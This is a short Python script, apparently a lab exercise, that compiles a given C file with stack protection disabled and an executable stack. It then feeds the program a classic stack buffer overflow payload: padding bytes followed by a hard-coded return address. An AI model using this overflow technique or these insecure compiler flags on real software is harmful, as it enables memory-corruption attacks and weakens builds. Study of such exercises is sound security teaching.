import os
import subprocess
import sys

TARGET_DIR_0 = "\x69\x51\x55\x55\x55\x55"

def err_ext(msg: str) -> None:
    print(msg)
    sys.exit(1)

def generate_exploit_str(target_dir: str, buff_size=16, offset=8) -> str:
    return 'A' * (buff_size + offset) + target_dir

def compile_insecure(path: str) -> None:
    print(f"Compilando archivo: {path}")
    c = subprocess.run(f"gcc -fno-stack-protector -z execstack {path} -o a.out",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if c.returncode != 0:
        err_ext("Error compilando")

def exploit(path: str, target_dir: str,
            buff_size: int, offset: int) -> None:
    compile_insecure(path)
    ex_str = generate_exploit_str(target_dir, buff_size, offset)
    try:
        p = subprocess.Popen(['./a.out'], stdin=subprocess.PIPE)
        p.communicate(ex_str.encode())
    except:
        err_ext("Error ejecutando exploit")

if __name__ == "__main__":
    if len(sys.argv) <= 1:
        err_ext("Insuficientes argumentos")

    if (target := sys.argv[1]) is not None:
        if os.path.isfile(target):
            exploit(target, TARGET_DIR_0, 16, 8)
